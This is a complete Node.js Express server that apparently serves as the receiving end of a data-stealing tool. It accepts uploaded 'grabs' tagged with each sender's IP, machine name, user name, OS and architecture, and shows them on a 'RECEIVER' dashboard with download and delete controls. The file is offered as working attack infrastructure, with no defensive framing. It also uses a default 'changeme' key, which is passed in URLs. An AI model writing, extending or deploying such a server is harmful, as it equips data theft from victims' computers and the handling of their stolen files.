const express = require("express");
const multer = require("multer");
const path = require("path");
const fs = require("fs");

const app = express();
const PORT = process.env.PORT || 3000;
const API_KEY = process.env.API_KEY || "changeme";
const UPLOAD_DIR = path.join(__dirname, "uploads");
const META_FILE = path.join(__dirname, "metadata.json");

if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
if (!fs.existsSync(META_FILE)) fs.writeFileSync(META_FILE, "[]");

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, UPLOAD_DIR),
  filename: (req, file, cb) => {
    const ts = new Date().toISOString().replace(/[:.]/g, "-");
    cb(null, `grab_${ts}_${file.originalname}`);
  },
});
const upload = multer({ storage, limits: { fileSize: 500 * 1024 * 1024 } });

function checkKey(req, res, next) {
  const key = req.query.key || req.headers["x-api-key"] || (req.headers.authorization || "").replace("Bearer ", "");
  if (key !== API_KEY) return res.status(401).json({ error: "unauthorized" });
  next();
}

function loadMeta() {
  try { return JSON.parse(fs.readFileSync(META_FILE, "utf8")); }
  catch { return []; }
}

function saveMeta(data) {
  fs.writeFileSync(META_FILE, JSON.stringify(data, null, 2));
}

function formatSize(bytes) {
  if (bytes < 1024) return bytes + " B";
  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + " KB";
  if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + " MB";
  return (bytes / 1073741824).toFixed(2) + " GB";
}

app.post("/upload", checkKey, upload.single("file"), (req, res) => {
  if (!req.file) return res.status(400).json({ error: "no file" });

  const meta = loadMeta();
  const entry = {
    filename: req.file.filename,
    originalName: req.file.originalname,
    size: req.file.size,
    sizeHuman: formatSize(req.file.size),
    uploadTime: new Date().toISOString(),
    ip: req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown",
    machine: req.query.machine || req.body?.machine || "unknown",
    user: req.query.user || req.body?.user || "unknown",
    os: req.query.os || req.body?.os || "unknown",
    arch: req.query.arch || req.body?.arch || "unknown",
  };
  meta.unshift(entry);
  saveMeta(meta);

  res.json({ status: "ok", filename: req.file.filename });
});

app.get("/", checkKey, (req, res) => {
  const meta = loadMeta();
  const totalSize = meta.reduce((s, e) => s + (e.size || 0), 0);
  const key = req.query.key;
  res.send(buildDashboard(meta, totalSize, key));
});

app.get("/download/:filename", checkKey, (req, res) => {
  const fp = path.join(UPLOAD_DIR, path.basename(req.params.filename));
  if (!fs.existsSync(fp)) return res.status(404).json({ error: "not found" });
  res.download(fp);
});

app.post("/delete/:filename", checkKey, (req, res) => {
  const fname = path.basename(req.params.filename);
  const fp = path.join(UPLOAD_DIR, fname);
  if (fs.existsSync(fp)) fs.unlinkSync(fp);
  let meta = loadMeta();
  meta = meta.filter((e) => e.filename !== fname);
  saveMeta(meta);
  res.redirect("/?key=" + (req.query.key || ""));
});

function buildDashboard(entries, totalSize, key) {
  const rows = entries.map((e, i) => `
    <tr>
      <td>${i + 1}</td>
      <td><span class="badge ${e.os?.toLowerCase().includes("windows") ? "win" : "other"}">${escHtml(e.os)}</span></td>
      <td>${escHtml(e.machine)}\\${escHtml(e.user)}</td>
      <td>${escHtml(e.arch)}</td>
      <td>${escHtml(e.ip)}</td>
      <td>${escHtml(e.sizeHuman || formatSize(e.size || 0))}</td>
      <td>${new Date(e.uploadTime).toLocaleString("en-GB", { timeZone: "UTC", hour12: false })}</td>
      <td>
        <a class="btn dl" href="/download/${encodeURIComponent(e.filename)}?key=${key}">download</a>
        <form method="POST" action="/delete/${encodeURIComponent(e.filename)}?key=${key}" style="display:inline" onsubmit="return confirm('delete?')">
          <button class="btn rm" type="submit">delete</button>
        </form>
      </td>
    </tr>`).join("");

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>receiver</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a1a;color:#ccc;font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:13px}
.wrap{max-width:1400px;margin:0 auto;padding:20px}
.header{display:flex;align-items:center;justify-content:space-between;padding:20px 0;border-bottom:1px solid #1a1a3e}
.header h1{color:#e94560;font-size:22px;letter-spacing:2px}
.stats{display:flex;gap:30px;margin:20px 0}
.stat{background:#12122a;border:1px solid #1a1a3e;border-radius:8px;padding:16px 24px;min-width:160px}
.stat .label{color:#666;font-size:11px;text-transform:uppercase;letter-spacing:1px}
.stat .value{color:#e94560;font-size:28px;font-weight:bold;margin-top:4px}
table{width:100%;border-collapse:collapse;margin-top:20px}
th{background:#12122a;color:#e94560;text-align:left;padding:12px 14px;font-size:11px;text-transform:uppercase;letter-spacing:1px;border-bottom:2px solid #e94560}
td{padding:10px 14px;border-bottom:1px solid #151530}
tr:hover{background:#0f0f2a}
.badge{padding:3px 8px;border-radius:4px;font-size:11px;font-weight:bold}
.badge.win{background:#1a3a1a;color:#4ade80}
.badge.other{background:#3a1a1a;color:#f87171}
.btn{padding:4px 12px;border-radius:4px;font-size:11px;text-decoration:none;cursor:pointer;border:none;font-family:inherit}
.btn.dl{background:#16213e;color:#4fc3f7;border:1px solid #1a3a5e}
.btn.dl:hover{background:#1a3a5e}
.btn.rm{background:#2a1015;color:#e94560;border:1px solid #3a1520}
.btn.rm:hover{background:#3a1520}
.empty{text-align:center;padding:60px;color:#444;font-size:16px}
.pulse{display:inline-block;width:8px;height:8px;background:#4ade80;border-radius:50%;margin-right:8px;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
.footer{text-align:center;padding:20px;color:#333;font-size:11px;margin-top:40px}
@media(max-width:900px){.stats{flex-wrap:wrap}.stat{min-width:120px}table{font-size:11px}td,th{padding:6px 8px}}
</style>
</head>
<body>
<div class="wrap">
  <div class="header">
    <h1><span class="pulse"></span>RECEIVER</h1>
    <span style="color:#444">auto-refresh 30s</span>
  </div>
  <div class="stats">
    <div class="stat"><div class="label">total grabs</div><div class="value">${entries.length}</div></div>
    <div class="stat"><div class="label">total size</div><div class="value">${formatSize(totalSize)}</div></div>
    <div class="stat"><div class="label">last grab</div><div class="value" style="font-size:14px">${entries.length ? new Date(entries[0].uploadTime).toLocaleString("en-GB", { timeZone: "UTC", hour12: false }) : "none"}</div></div>
  </div>
  ${entries.length ? `<table>
    <thead><tr><th>#</th><th>os</th><th>device</th><th>arch</th><th>ip</th><th>size</th><th>time</th><th>actions</th></tr></thead>
    <tbody>${rows}</tbody>
  </table>` : '<div class="empty">no grabs yet</div>'}
  <div class="footer">receiver v1.0</div>
</div>
<script>setTimeout(()=>location.reload(),30000)</script>
</body>
</html>`;
}

function escHtml(s) {
  if (!s) return "";
  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
}

app.listen(PORT, () => {
  console.log(`[+] receiver running on port ${PORT}`);
});
